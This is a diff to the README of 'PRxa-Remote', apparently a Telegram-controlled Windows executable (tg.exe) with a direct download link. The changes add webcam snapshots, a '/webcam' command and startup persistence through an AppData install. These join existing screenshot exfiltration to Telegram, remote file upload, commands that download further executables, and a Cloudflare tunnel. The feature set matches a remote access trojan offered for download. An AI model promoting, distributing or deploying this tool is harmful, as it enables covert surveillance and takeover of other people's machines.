@@ -20,10 +20,10 @@
 ## ⬇️ Download
 
 ```
-https://github.com/ItzRealRxa/PRxa-Remote/releases/download/v2/tg.exe
+https://github.com/ItzRealRxa/PRxa-Remote/releases/download/v3/tg.exe
 ```
 
-**[🔴 Click Here to Download tg.exe](https://github.com/ItzRealRxa/PRxa-Remote/releases/download/v2/tg.exe)**
+**[🔴 Click Here to Download tg.exe](https://github.com/ItzRealRxa/PRxa-Remote/releases/download/v3/tg.exe)**
 
 > Double-click `tg.exe` — no installation needed.
 
@@ -35,11 +35,13 @@ https://github.com/ItzRealRxa/PRxa-Remote/releases/download/v2/tg.exe
 |---|---|
 | 🖥️ **Privacy Shield** | Monitor Off/On toggle |
 | 🔒 **Security** | Lock, Sleep, Shutdown |
+| 📷 **Webcam** | Instant live webcam snapshot |
+| 📁 **Persistence** | Auto AppData install & startup |
 | 🎯 **Mouse** | Click, Right-click, Center, Scroll |
 | ⌨️ **Keyboard** | Type text, Alt+Tab, Escape, Enter |
 | 🎵 **Media** | Play/Pause, Next, Prev, Volume |
 | 🌐 **Browser** | Open URL, Launch Chrome/YouTube |
-| 🖼️ **Desktop** | Change Wallpaper, Show Desktop |
+| 🖼️ **Desktop** | Change Wallpaper, Show Desktop, Toggle Icons |
 | 📊 **System Stats** | Live CPU, RAM, Battery overlay |
 | 📷 **Screenshot** | Send to Telegram instantly |
 | ♻️ **Auto-Relink** | Dynamic Cloudflare tunnel |
@@ -57,6 +59,7 @@ https://github.com/ItzRealRxa/PRxa-Remote/releases/download/v2/tg.exe
 | `/upload` | Upload a file to PC Downloads |
 | `/exec` | Download the remote control exe |
 | `/cmd` | Download via direct link |
+| `/webcam` | Take a snapshot from PC webcam |
 
 ---
 
